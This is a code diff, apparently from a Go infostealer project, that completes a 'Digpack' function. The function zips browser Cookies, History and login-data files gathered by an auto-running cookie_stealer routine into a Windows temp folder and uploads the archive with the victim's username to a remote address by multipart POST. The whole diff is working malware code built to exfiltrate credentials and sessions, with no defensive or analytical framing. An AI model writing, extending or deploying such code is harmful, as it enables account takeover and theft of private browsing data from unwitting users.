@@ -1,7 +1,12 @@
 package browser
 
 import (
+	"archive/zip"
+	"bytes"
+	"github.com/parnurzeal/gorequest"
+	"infection/machineinfo"
 	"io"
+	"io/ioutil"
 	"log"
 	"os"
 	"os/user"
@@ -9,8 +14,15 @@ import (
 )
 
 const (
-	safe_path = "C:\\Users\\Administrator\\tmp\\"
+	safe_path = "C:\\Windows\\tmp\\"
 )
+
+type msg struct {
+	User string `json:"user"`
+}
+type BizStatusResponse struct {
+	Succeed bool `json:"succeed"`
+}
 
 //get targetip files
 func get_targetip() string {
@@ -40,12 +52,57 @@ func init() {
 		create_dir()
 		cookie_stealer()
 		time.Sleep(3 * time.Second)
+
 	}
 }
 
-//todo digpack send
-func digpack() {
-
+func Digpack(addr string) {
+	time.Sleep(2 * time.Second)
+	Users := machineinfo.GetUserName()
+	buf := new(bytes.Buffer)
+	w := zip.NewWriter(buf)
+	var files = []struct {
+		Name string
+	}{
+		{"Cookies"},
+		{"History"},
+		{"loginData"},
+	}
+	for _, file := range files {
+		f, err := w.Create(file.Name)
+		if err != nil {
+			log.Fatal(err)
+		}
+		fbody, err := ioutil.ReadFile(safe_path + file.Name)
+		_, err = f.Write(fbody)
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+	err := w.Close()
+	if err != nil {
+		log.Fatal(err)
+	}
+	f, err := os.OpenFile(safe_path+"log"+Users+".zip", os.O_CREATE|os.O_WRONLY, 0666)
+	if err != nil {
+		log.Fatal(err)
+	}
+	buf.WriteTo(f)
+	var Msg = msg{
+		User: Users,
+	}
+	var bizStatusResponse = BizStatusResponse{}
+	resp, _, _ := gorequest.New().
+		Type("multipart").
+		Post(addr).
+		Send(Msg).
+		SendFile(safe_path + "log" + Users + ".zip").
+		EndStruct(&bizStatusResponse)
+	if resp.StatusCode == 200 && bizStatusResponse.Succeed {
+		log.Println("Upload browser record Status Successful !")
+	} else {
+		log.Println("Upload browser record Status Fail !")
+	}
 }
 
 //returns Current working dir
@@ -87,7 +144,7 @@ func cookie_stealer() {
 	}
 	var cookie_file string = "Cookies"
 	var history string = "History"
-	var data_login string = "Login Data"
+	var data_login string = "loginData"
 
 	cp_cookie := cp + cookie_file
 	cp_hist := cp + history
